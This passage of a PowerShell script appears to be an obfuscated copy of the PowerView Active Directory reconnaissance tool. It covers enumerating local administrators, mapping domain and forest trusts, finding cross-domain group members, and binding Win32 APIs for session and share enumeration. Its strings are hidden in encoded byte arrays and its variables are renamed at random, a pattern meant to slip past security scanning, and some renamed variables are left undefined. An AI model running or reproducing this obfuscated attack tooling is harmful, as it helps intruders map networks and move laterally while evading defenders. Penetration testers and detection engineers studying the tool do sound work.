        }

        if($TrustGroups) {
            
            Write-Verbose (HandleResult95 @(155,216,124,72,19,28,158,189,254,125,77,57,38,185,170,248,112,63,112,48,141,158,243,95,49,1,22,173,173,199,100,72,0,3,176,176,253,25,46,62,39,163,244,162) @(201,159,42,120,73,68,212))

            # find all group names that have one or more users in another domain
            $i8d3sQ4 = Find-ForeignGroup -Domain $Domain -DomainController $DomainController | ForEach-Object { $_.GroupName } | Sort-Object -Unique

            $TrustGroupsSIDs = $i8d3sQ4 | ForEach-Object { 
                # ignore the builtin administrators group for a DC (S-1-5-32-544)
                # TODO: ignore all default built in sids?
                Get-NetGroup -Domain $Domain -DomainController $DomainController -GroupName $_ -FullData | Where-Object { $_.objectsid -notmatch (HandleResult95 @(22,54,67,244,13,61,22,59,62,246,8,29,13,27,34,188) @(67,79,115,140,65,105)) } | ForEach-Object { $_.objectsid }
            }

            # query for the primary domain controller so we can extract the domain SID for filtering
            $DomainSID = Get-DomainSID -Domain $Domain
        }

        # script block that enumerates a server
        $h6EYtum2 = {
            param($ComputerName, $Ping, $OutFile, $DomainSID, $TrustGroupsSIDs)

            # optionally check if the server is up first
            $yssh = $True
            if($Ping) {
                $yssh = Test-Connection -Count 1 -Quiet -ComputerName $ComputerName
            }
            if($yssh) {
                # grab the users for the local admins on this server
                $dlsnHVLX = Get-NetLocalGroup -ComputerName $ComputerName

                # if we just want to return cross-trust users
                if($DomainSID -and $hUvpc) {
                    # get the local machine SID
                    $cXlWen = ($dlsnHVLX | Where-Object { $_.SID -match '.*-500$' }).SID -replace (HandleResult95 @(164,81,129,17,165,70,133,91) @(232,5,212,102))

                    # filter out accounts that begin with the machine SID and domain SID
                    #   but preserve any groups that have users across a trust ($TrustGroupSIDS)
                    $dlsnHVLX = $dlsnHVLX | Where-Object { ($TrustGroupsSIDs -contains $_.SID) -or ((-not $_.SID.startsWith($cXlWen)) -and (-not $_.SID.startsWith($DomainSID))) }
                }

                if($dlsnHVLX -and ($dlsnHVLX.Length -ne 0)) {
                    # output the results to a csv if specified
                    if($OutFile) {
                        $dlsnHVLX | Export-PowerViewCSV -OutFile $OutFile
                    }
                    else {
                        # otherwise return the user objects
                        $dlsnHVLX
                    }
                }
                else {
                    Write-Verbose ((HandleResult95 @(46,217,175,199,151,60,149,159,234,150,47,218,179,251,148,3,233,161,233,178,29,232,191,218,188,20,246,130,234,153,35,217,139,145,238,30) @(121,160,233,163,222)) + $BCqCw1p)
                }
            }
        }

    }

    process {

        if($Threads) {
            Write-Verbose ((HandleResult95 @(137,110,61,230,36,76,188,81,23,209,46,88,133,97,53,253,39,118,234,88,58,222,34,81,187,113,20,241,34,102,183,79,41,193,0,74,188,79,50,175,15,96,226,11) @(223,54,115,150,70,33)) + $Threads)

            # if we're using threading, kick off the script block with Invoke-ThreadedFunction
            $O2kwi = @{
                'Ping' = $(-not $NoPing)
                'OutFile' = $OutFile
                'DomainSID' = $DomainSID
                'TrustGroupsSIDs' = $TrustGroupsSIDs
            }

            # kick off the threaded script block + arguments 
            Invoke-ThreadedFunction -ComputerName $ComputerName -ScriptBlock $h6EYtum2 -ScriptParameters $O2kwi
        }

        else {
            if(-not $NoPing -and ($ComputerName.count -ne 1)) {
                # ping all hosts in parallel
                $Ping = {param($ComputerName) if(Test-Connection -ComputerName $ComputerName -Count 1 -Quiet -ErrorAction Stop){$ComputerName}}
                $ComputerName = Invoke-ThreadedFunction -NoImports -ComputerName $ComputerName -ScriptBlock $Ping -Threads 100
            }

            Write-Verbose ((HandleResult95 @(171,38,99,184,218,186,13,101,184,212,186,44,90,155,166,205,61,68,150,255,159,54,81,170,201,149,29,123,133,160,174,47,119,177,198,155,62,84,229,233,152,23,94,234,218,189,98,46) @(252,95,19,220,147)) + $($ComputerName.count))
            $ypmBN = 0

            ForEach ($fa0ya in $ComputerName) {

                $ypmBN = $ypmBN + 1

                # sleep for our semi-randomized interval
                Start-Sleep -Seconds $WLAr.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose ((HandleResult95 @(96,138,133,61,126,182,163,44,83,164,196,53,84,158,179,105,86,164,192,55,126,187,187,53,84,157,175,53,84,154,180,100) @(55,243,245,89)) + $fa0ya + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ICg="))) + $ypmBN + (HandleResult95 @(116,63,254,243,162,142,0,69) @(61,120,199,158,235,207)) + $($ComputerName.count) + ")")
                Invoke-Command -ScriptBlock $h6EYtum2 -ArgumentList $fa0ya, $False, $OutFile, $DomainSID, $TrustGroupsSIDs
            }
        }
    }
}


########################################################
#
# Domain trust functions below.
#
########################################################

function Get-NetDomainTrust {
<#
    .SYNOPSIS

        Return all domain trusts for the current domain or
        a specified domain.

    .PARAMETER Domain

        The domain whose trusts to enumerate, defaults to the current domain.

    .PARAMETER DomainController

        Domain controller to reflect LDAP queries through.

    .PARAMETER LDAP

        Switch. Use LDAP queries to enumerate the trusts instead of direct domain connections. 
        More likely to get around network segmentation, but not as accurate.

    .PARAMETER PageSize

        The PageSize to set for the LDAP searcher object.

    .EXAMPLE

        PS C:\> Get-NetDomainTrust

        Return domain trusts for the current domain.

    .EXAMPLE

        PS C:\> Get-NetDomainTrust -Domain "prod.testlab.local"

        Return domain trusts for the "prod.testlab.local" domain.

    .EXAMPLE

        PS C:\> Get-NetDomainTrust -Domain "prod.testlab.local" -DomainController "PRIMARY.testlab.local"

        Return domain trusts for the "prod.testlab.local" domain, reflecting
        queries through the "Primary.testlab.local" domain controller
#>

    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [String]
        $Domain = (Get-NetDomain).Name,

        [String]
        $DomainController,

        [Switch]
        $LDAP,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    process {
        if($LDAP -or $DomainController) {

            $ile3 = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -PageSize $PageSize

            if($ile3) {

                $ile3.filter = '(&(objectClass=trustedDomain))'

                $ile3.FindAll() | Where-Object {$_} | ForEach-Object {
                    $f3P1QS = $_.Properties
                    $kcM83Fh3 = New-Object PSObject
                    $XCnZwTqE = Switch ($f3P1QS.trustattributes)
                    {
                        0x001 { (HandleResult95 @(187,138,134,72,203,43,139,158,230,106,166,98,184,191,237,77,247,117,140,218) @(217,231,191,61,147,24)) }
                        0x002 { (HandleResult95 @(84,101,59,113,111,104,103,21,96,115,9,75,27,111,77,5) @(48,61,121,2,53)) }
                        0x004 { (HandleResult95 @(244,219,168,116,18,20,209,246,154,91,29,12,205,212,172,122,43,62,174,247,167,75,29,12) @(151,131,254,28,113,121)) }
                        0x008 { (HandleResult95 @(199,115,147,76,141,208,72,173,70,153,103,174,209,81,168,100,203,109,133,248,98,240,75,151) @(157,30,170,53,215,136,6)) }
                        0x010 { (HandleResult95 @(201,28,82,28,5,217,222,73,122,89,44,132,201,120,45,26,3,135,214,31,121,61,95,159) @(144,47,24,106,102,234)) }
                        0x020 { (HandleResult95 @(226,232,224,215,57,140,54,243,130,190,189,46,168,55,208,160,232,166,101,246) @(134,218,140,231,88,203,90)) }
                        0x040 { (HandleResult95 @(66,14,51,131,248,121,141,64,31,33,161,199,123,135,78,118,35,183,235,84,134,113,49,68) @(38,70,121,239,161,33,223)) }
                        0x080 { (HandleResult95 @(106,124,122,57,71,25,61,132,106,108,126,100,71,27,86,155,87,78,98,110,126,125,90,136,109,90,92,127,64,109,3,148,108,83,13,53) @(14,52,48,8,36,42,111,226)) }
                        0x100 { (HandleResult95 @(192,127,159,183,121,151,101,179,226,66,234,91,182,183,35,204,109,141,200,124,197,5,131,179,121,211,10,232) @(164,55,213,134,26)) }
                        Default { 
                            Write-Warning ((HandleResult95 @(151,138,218,78,131,219,248,238,141,85,163,134,162,179,185,70,133,245,131,181,139,116,179,207,160,138,165,13,133,241,148,235,166,125,220,139) @(193,221,239,60,225,182)) + $($f3P1QS.trustattributes));
                            ($($f3P1QS.trustattributes));
                        }
                    }
                    $zM44F = Switch ($f3P1QS.trustdirection) {
                        0 { (HandleResult95 @(174,60,243,123,36,171,49,236,91,42,173,70) @(252,123,159,1,125)) }
                        1 { (HandleResult95 @(127,84,205,201,26,140,122,118,162,225,69,130) @(44,3,248,160,120,191)) }
                        2 { (HandleResult95 @(10,43,5,241,3,76,122,111,122,62,144,103) @(94,24,83,193,90,33,67)) }
                        3 { (HandleResult95 @(37,215,5,79,111,229,202,230,45,137,59,84,108,143,181,226,22,251,84,25) @(116,186,105,36,14,189,128,138)) }
                    }
                    $qngo785J = New-Object Guid @(,$f3P1QS.objectguid[0])
                    $kcM83Fh3 | Add-Member Noteproperty 'SourceName' $Domain
                    $kcM83Fh3 | Add-Member Noteproperty 'TargetName' $f3P1QS.name[0]
                    $kcM83Fh3 | Add-Member Noteproperty 'ObjectGuid' ("{" + $qngo785J + "}")
                    $kcM83Fh3 | Add-Member Noteproperty 'TrustType' ($XCnZwTqE)
                    $kcM83Fh3 | Add-Member Noteproperty 'TrustDirection' ($zM44F)
                    $kcM83Fh3
                }
            }
        }

        else {
            # if we're using direct domain connections
            $cYF9amo6 = Get-NetDomain -Domain $Domain
            
            if($cYF9amo6) {
                (Get-NetDomain -Domain $Domain).GetAllTrustRelationships()
            }     
        }
    }
}


function Get-NetForestTrust {
<#
    .SYNOPSIS

        Return all trusts for the current forest.

    .PARAMETER Forest

        Return trusts for the specified forest.

    .EXAMPLE

        PS C:\> Get-NetForestTrust

        Return current forest trusts.

    .EXAMPLE

        PS C:\> Get-NetForestTrust -Forest "test"

        Return trusts for the "test" forest.
#>

    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [String]
        $Forest
    )

    process {
        $zVaW1I = Get-NetForest -Forest $Forest
        if($zVaW1I) {
            $zVaW1I.GetAllTrustRelationships()
        }
    }
}


function Find-ForeignUser {
<#
    .SYNOPSIS

        Enumerates users who are in groups outside of their
        principal domain. The -Recurse option will try to map all 
        transitive domain trust relationships and enumerate all 
        users who are in groups outside of their principal domain.

    .PARAMETER UserName

        Username to filter results for, wildcards accepted.

    .PARAMETER Domain

        Domain to query for users, defaults to the current domain.

    .PARAMETER DomainController

        Domain controller to reflect LDAP queries through.

    .PARAMETER LDAP

        Switch. Use LDAP queries to enumerate the trusts instead of direct domain connections.
        More likely to get around network segmentation, but not as accurate.

    .PARAMETER Recurse

        Switch. Enumerate all user trust groups from all reachable domains recursively.

    .PARAMETER PageSize

        The PageSize to set for the LDAP searcher object.

    .LINK

        http://blog.harmj0y.net/
#>

    [CmdletBinding()]
    param(
        [String]
        $UserName,

        [String]
        $Domain,

        [String]
        $DomainController,

        [Switch]
        $LDAP,

        [Switch]
        $Recurse,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    function Get-ForeignUser {
        # helper used to enumerate users who are in groups outside of their principal domain
        param(
            [String]
            $UserName,

            [String]
            $Domain,

            [String]
            $DomainController,

            [ValidateRange(1,10000)] 
            [Int]
            $PageSize = 200
        )

        if ($Domain) {
            # get the domain name into distinguished form
            $eXDL = (HandleResult95 @(36,11,174,75) @(118,78,227,114,25)) + $Domain -replace '\.',',DC='
        }
        else {
            $eXDL = [String] ([adsi]'').distinguishedname
            $Domain = $eXDL -replace 'DC=','' -replace ',','.'
        }

        Get-NetUser -Domain $Domain -DomainController $DomainController -UserName $UserName -PageSize $PageSize | Where-Object {$_.memberof} | ForEach-Object {
            ForEach ($mFaI in $_.memberof) {
                $sfOxA8mE = $mFaI.IndexOf((HandleResult95 @(42,154,79,229) @(120,223,2,220,45,77,94)))
                if($sfOxA8mE) {
                    
                    $gaQJ = $($mFaI.substring($sfOxA8mE)) -replace 'DC=','' -replace ',','.'
                    
                    if ($gaQJ.CompareTo($Domain)) {
                        # if the group domain doesn't match the user domain, output
                        $GroupName = $mFaI.split(",")[0].split("=")[1]
                        $Xj0Ux = New-Object PSObject
                        $Xj0Ux | Add-Member Noteproperty 'UserDomain' $Domain
                        $Xj0Ux | Add-Member Noteproperty 'UserName' $_.samaccountname
                        $Xj0Ux | Add-Member Noteproperty 'GroupDomain' $gaQJ
                        $Xj0Ux | Add-Member Noteproperty 'GroupName' $GroupName
                        $Xj0Ux | Add-Member Noteproperty 'GroupDN' $mFaI
                        $Xj0Ux
                    }
                }
            }
        }
    }

    if ($Recurse) {
        # get all rechable domains in the trust mesh and uniquify them
        if($LDAP -or $DomainController) {
            $idyQ = Invoke-MapDomainTrust -LDAP -DomainController $DomainController -PageSize $PageSize | ForEach-Object { $_.SourceDomain } | Sort-Object -Unique
        }
        else {
            $idyQ = Invoke-MapDomainTrust -PageSize $PageSize | ForEach-Object { $_.SourceDomain } | Sort-Object -Unique
        }

        ForEach($kcM83Fh3 in $idyQ) {
            # get the trust groups for each domain in the trust mesh
            Write-Verbose ((HandleResult95 @(179,169,133,248,189,95,122,152,167,232,155,175,106,65,130,153,212,129,149,57,79,210,175,215,147,236,66,90,133,166,242,179,150,79,64,148,183,247,155,169,106,123,167,142,210,160,158,53) @(225,254,176,201,223,8,44)) + $kcM83Fh3)
            Get-ForeignUser -Domain $kcM83Fh3 -UserName $UserName -PageSize $PageSize
        }
    }
    else {
        Get-ForeignUser -Domain $Domain -DomainController $DomainController -UserName $UserName -PageSize $PageSize
    }
}


function Find-ForeignGroup {
<#
    .SYNOPSIS

        Enumerates all the members of a given domain's groups
        and finds users that are not in the queried domain.
        The -Recurse flag will perform this enumeration for all
        eachable domain trusts.

    .PARAMETER GroupName

        Groupname to filter results for, wildcards accepted.

    .PARAMETER Domain

        Domain to query for groups, defaults to the current domain.

    .PARAMETER DomainController

        Domain controller to reflect LDAP queries through.

    .PARAMETER LDAP

        Switch. Use LDAP queries to enumerate the trusts instead of direct domain connections.
        More likely to get around network segmentation, but not as accurate.

    .PARAMETER Recurse

        Switch. Enumerate all group trust users from all reachable domains recursively.

    .PARAMETER PageSize

        The PageSize to set for the LDAP searcher object.

    .LINK

        http://blog.harmj0y.net/
#>

    [CmdletBinding()]
    param(
        [String]
        $GroupName = '*',

        [String]
        $Domain,

        [String]
        $DomainController,

        [Switch]
        $LDAP,

        [Switch]
        $Recurse,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    function Get-ForeignGroup {
        param(
            [String]
            $GroupName = '*',

            [String]
            $Domain,

            [String]
            $DomainController,

            [ValidateRange(1,10000)] 
            [Int]
            $PageSize = 200
        )

        if(-not $Domain) {
            $Domain = (Get-NetDomain).Name
        }

        $T0YsdsQ = ((HandleResult95 @(58,168,131,82) @(104,237,206,107)) + $($Domain.Replace('.', ',DC=')))
        Write-Verbose ((HandleResult95 @(93,192,77,68,246,88,235,1,98,234,59,177,61,113,146,50) @(15,135,116,48,175)) + $T0YsdsQ)

        # standard group names to ignore
        $AJEgGK = @((HandleResult95 @(129,102,210,166,75,185,115,161) @(215,62,156,202,40)), (HandleResult95 @(137,176,157,158,67,140,155,209,163,92,141,141,254,178,80,161) @(219,247,164,234,26)), (HandleResult95 @(70,33,152,128,19,21,70,104) @(20,18,206,236,112,38)))

        # get all the groupnames for the given domain
        Get-NetGroup -GroupName $GroupName -Domain $Domain -DomainController $DomainController -FullData -PageSize $PageSize | Where-Object {$_.member} | Where-Object {
            # exclude common large groups
            -not ($AJEgGK -contains $_.samaccountname) } | ForEach-Object {
                
                $GroupName = $_.samAccountName

                $_.member | ForEach-Object {
                    # filter for foreign SIDs in the cn field for users in another domain,
                    #   or if the DN doesn't end with the proper DN for the queried domain  
                    if (($_ -match 'CN=S-1-5-21.*-.*') -or ($T0YsdsQ -ne ($_.substring($_.IndexOf((HandleResult95 @(135,90,89,182) @(213,31,20,143,1,159,154,83))))))) {

                        $JrDg6EbO = $_.subString($_.IndexOf((HandleResult95 @(158,131,160,70) @(204,198,237,127,153,47)))) -replace 'DC=','' -replace ',','.'
                        $UserName = $_.split(",")[0].split("=")[1]

                        $MoW7 = New-Object PSObject
                        $MoW7 | Add-Member Noteproperty 'GroupDomain' $Domain
                        $MoW7 | Add-Member Noteproperty 'GroupName' $GroupName
                        $MoW7 | Add-Member Noteproperty 'UserDomain' $JrDg6EbO
                        $MoW7 | Add-Member Noteproperty 'UserName' $UserName
                        $MoW7 | Add-Member Noteproperty 'UserDN' $_
                        $MoW7
                    }
                }
        }
    }

    if ($Recurse) {
        # get all rechable domains in the trust mesh and uniquify them
        if($LDAP -or $DomainController) {
            $idyQ = Invoke-MapDomainTrust -LDAP -DomainController $DomainController -PageSize $PageSize | ForEach-Object { $_.SourceDomain } | Sort-Object -Unique
        }
        else {
            $idyQ = Invoke-MapDomainTrust -PageSize $PageSize | ForEach-Object { $_.SourceDomain } | Sort-Object -Unique
        }

        ForEach($kcM83Fh3 in $idyQ) {
            # get the trust groups for each domain in the trust mesh
            Write-Verbose ((HandleResult95 @(108,144,209,185,92,144,178,241,103,159,182,248,92,170,135,239,90,143,174,185,93,244,181,239,100,244,174,254,90,159,166,242,119,128,136,253,119,128,182,254,92,144,162,248,92,174,165,181) @(62,199,228,136)) + $kcM83Fh3)
            Get-ForeignGroup -GroupName $GroupName -Domain $Domain -DomainController $DomainController -PageSize $PageSize
        }
    }
    else {
        Get-ForeignGroup -GroupName $GroupName -Domain $Domain -DomainController $DomainController -PageSize $PageSize
    }
}


function Invoke-MapDomainTrust {
<#
    .SYNOPSIS

        This function gets all trusts for the current domain,
        and tries to get all trusts for each domain it finds.

    .PARAMETER LDAP

        Switch. Use LDAP queries to enumerate the trusts instead of direct domain connections.
        More likely to get around network segmentation, but not as accurate.

    .PARAMETER DomainController

        Domain controller to reflect LDAP queries through.

    .PARAMETER PageSize

        The PageSize to set for the LDAP searcher object.

    .EXAMPLE

        PS C:\> Invoke-MapDomainTrust | Export-CSV -NoTypeInformation trusts.csv
        
        Map all reachable domain trusts and output everything to a .csv file.

    .LINK

        http://blog.harmj0y.net/
#>
    [CmdletBinding()]
    param(
        [Switch]
        $LDAP,

        [String]
        $DomainController,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    # keep track of domains seen so we don't hit infinite recursion
    $hljp = @{}

    # our domain status tracker
    $fljjwSnD = New-Object System.Collections.Stack

    # get the current domain and push it onto the stack
    $u28D = (Get-NetDomain).Name
    $fljjwSnD.push($u28D)

    while($fljjwSnD.Count -ne 0) {

        $Domain = $fljjwSnD.Pop()

        # if we haven't seen this domain before
        if (-not $hljp.ContainsKey($Domain)) {
            
            Write-Verbose ((HandleResult95 @(179,248,75,217,20,182,249,7,177,46,179,223,28,133,21,134,203,54,162,71,130,156,44,146,63,166,245,8,139,31,163,196,28,218,71,137,206,41,220,17,171,216,67,213) @(225,175,126,232,118)) + $Domain + "'")

            # mark it as seen in our list
            $Null = $hljp.add($Domain, "")

            try {
                # get all the trusts for this domain
                if($LDAP -or $DomainController) {
                    $s44ONL = Get-NetDomainTrust -Domain $Domain -LDAP -DomainController $DomainController -PageSize $PageSize
                }
                else {
                    $s44ONL = Get-NetDomainTrust -Domain $Domain -PageSize $PageSize
                }

                if($s44ONL -isnot [system.array]) {
                    $s44ONL = @($s44ONL)
                }

                # get any forest trusts, if they exist
                $s44ONL += Get-NetForestTrust -Forest $Domain

                if ($s44ONL) {

                    # enumerate each trust found
                    ForEach ($yFmFqxST in $s44ONL) {
                        $V71Lz = $yFmFqxST.SourceName
                        $gxZK = $yFmFqxST.TargetName
                        $iVnnHA = $yFmFqxST.TrustType
                        $DxOFhPGW = $yFmFqxST.TrustDirection

                        # make sure we process the target
                        $Null = $fljjwSnD.push($gxZK)

                        # build the nicely-parsable custom output object
                        $kcM83Fh3 = New-Object PSObject
                        $kcM83Fh3 | Add-Member Noteproperty 'SourceDomain' ($V71Lz)
                        $kcM83Fh3 | Add-Member Noteproperty 'TargetDomain' ($gxZK)
                        $kcM83Fh3 | Add-Member Noteproperty 'TrustType' ($iVnnHA)
                        $kcM83Fh3 | Add-Member Noteproperty 'TrustDirection' ($DxOFhPGW)
                        $kcM83Fh3
                    }
                }
            }
            catch {
                Write-Warning ((HandleResult95 @(175,110,95,236,177,98,73,53,155,122,32,241,183,78,94,113) @(248,23,25,136,248,39,31,76)) + $_)
            }
        }
    }
}


########################################################
#
# Expose the Win32API functions and datastructures below
# using PSReflect. 
# Warning: Once these are executed, they are baked in 
# and can't be changed while the script is running!
#
########################################################

$WVhP = New-InMemoryModule -ModuleName Win32

# all of the Win32 API functions we need
$d1jYhq = @(
    (func netapi32 NetShareEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetWkstaUserEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetSessionEnum ([Int]) @([String], [String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetApiBufferFree ([Int]) @([IntPtr])),
    (func advapi32 OpenSCManagerW ([IntPtr]) @([String], [String], [Int])),
    (func advapi32 CloseServiceHandle ([Int]) @([IntPtr])),
    (func wtsapi32 WTSOpenServerEx ([IntPtr]) @([String])),
    (func wtsapi32 WTSEnumerateSessionsEx ([Int]) @([IntPtr], [Int32].MakeByRefType(), [Int], [IntPtr].MakeByRefType(),  [Int32].MakeByRefType())),
    (func wtsapi32 WTSQuerySessionInformation ([Int]) @([IntPtr], [Int], [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType())),
    (func wtsapi32 WTSFreeMemoryEx ([Int]) @([Int32], [IntPtr], [Int32])),
    (func wtsapi32 WTSFreeMemory ([Int]) @([IntPtr])),
    (func wtsapi32 WTSCloseServer ([Int]) @([IntPtr])),
    (func kernel32 GetLastError ([Int]) @())
)

# enum used by $WTS_SESSION_INFO_1 below
$NMRvD = psenum $WVhP WTS_CONNECTSTATE_CLASS UInt16 @{
    Active       =    0
    Connected    =    1
    ConnectQuery =    2
    Shadow       =    3
    Disconnected =    4
    Idle         =    5
    Listen       =    6
    Reset        =    7
    Down         =    8
    Init         =    9
}

# the WTSEnumerateSessionsEx result structure
$iXPiA = struct $WVhP WTS_SESSION_INFO_1 @{
    ExecEnvId = field 0 UInt32
    State = field 1 $NMRvD
    SessionId = field 2 UInt32
    pSessionName = field 3 String -MarshalAs @('LPWStr')
    pHostName = field 4 String -MarshalAs @('LPWStr')
    pUserName = field 5 String -MarshalAs @('LPWStr')
    pDomainName = field 6 String -MarshalAs @('LPWStr')
    pFarmName = field 7 String -MarshalAs @('LPWStr')
}

# the particular WTSQuerySessionInformation result structure
$GkoHs2 = struct $WVhP WTS_CLIENT_ADDRESS @{
    AddressFamily = field 0 UInt32
    Address = field 1 Byte[] -MarshalAs @('ByValArray', 20)
}

# the NetShareEnum result structure
$SWAZiW = struct $WVhP SHARE_INFO_1 @{
    shi1_netname = field 0 String -MarshalAs @('LPWStr')
    shi1_type = field 1 UInt32
    shi1_remark = field 2 String -MarshalAs @('LPWStr')
}

# the NetWkstaUserEnum result structure
$JjX6hJWr = struct $WVhP WKSTA_USER_INFO_1 @{
    wkui1_username = field 0 String -MarshalAs @('LPWStr')
    wkui1_logon_domain = field 1 String -MarshalAs @('LPWStr')
    wkui1_oth_domains = field 2 String -MarshalAs @('LPWStr')
    wkui1_logon_server = field 3 String -MarshalAs @('LPWStr')
}

# the NetSessionEnum result structure
$LdmYxDq = struct $WVhP SESSION_INFO_10 @{
    sesi10_cname = field 0 String -MarshalAs @('LPWStr')
    sesi10_username = field 1 String -MarshalAs @('LPWStr')
    sesi10_time = field 2 UInt32
    sesi10_idle_time = field 3 UInt32
}


$o9eFXIA = $d1jYhq | Add-Win32Type -Module $WVhP -Namespace 'Win32'
$pyQHtec7 = $o9eFXIA['netapi32']
$FQMCj1Kr = $o9eFXIA['advapi32']
$jAC8b6ZC = $o9eFXIA['kernel32']
$KBfbHiS = $o9eFXIA['wtsapi32']


# aliases to help the PowerView 2.0 transition
Set-Alias Get-NetForestDomains Get-NetForestDomain
Set-Alias Get-NetDomainControllers Get-NetDomainController
Set-Alias Get-NetUserSPNs Get-NetUser
Set-Alias Invoke-NetUserAdd Add-NetUser
Set-Alias Invoke-NetGroupUserAdd Add-NetGroupUser
Set-Alias Get-NetComputers Get-NetComputer
Set-Alias Get-NetOUs Get-NetOU
Set-Alias Get-NetGUIDOUs Get-NetOU
Set-Alias Get-NetFileServers Get-NetFileServer
Set-Alias Get-NetSessions Get-NetSession
Set-Alias Get-NetRDPSessions Get-NetRDPSession
Set-Alias Get-NetProcesses Get-NetProcess
Set-Alias Get-UserLogonEvents Get-UserEvent
Set-Alias Get-UserTGTEvents Get-UserEvent
Set-Alias Get-UserProperties Get-UserProperty
Set-Alias Get-ComputerProperties Get-ComputerProperty
Set-Alias Invoke-UserHunterThreaded Invoke-UserHunter
Set-Alias Invoke-ProcessHunterThreaded Invoke-ProcessHunter
Set-Alias Invoke-ShareFinderThreaded Invoke-ShareFinder
Set-Alias Invoke-SearchFiles Find-InterestingFile
Set-Alias Invoke-UserFieldSearch Find-UserField
Set-Alias Invoke-ComputerFieldSearch Find-ComputerField
Set-Alias Invoke-FindLocalAdminAccess Find-LocalAdminAccess
Set-Alias Invoke-FindLocalAdminAccessThreaded Find-LocalAdminAccess
Set-Alias Get-NetDomainTrusts Get-NetDomainTrust
Set-Alias Get-NetForestTrusts Get-NetForestTrust
Set-Alias Invoke-MapDomainTrusts Invoke-MapDomainTrust
Set-Alias Invoke-FindUserTrustGroups Find-ForeignUser
Set-Alias Invoke-FindGroupTrustUsers Find-ForeignGroup
Set-Alias Invoke-EnumerateLocalTrustGroups Invoke-EnumerateLocalAdmin
Set-Alias Invoke-EnumerateLocalAdmins Invoke-EnumerateLocalAdmin
Set-Alias Invoke-EnumerateLocalAdminsThreaded Invoke-EnumerateLocalAdmin
Set-Alias Invoke-FindAllUserTrustGroups Find-ForeignUser
Set-Alias Find-UserTrustGroup Find-ForeignUser
Set-Alias Invoke-FindAllGroupTrustUsers Find-ForeignGroup
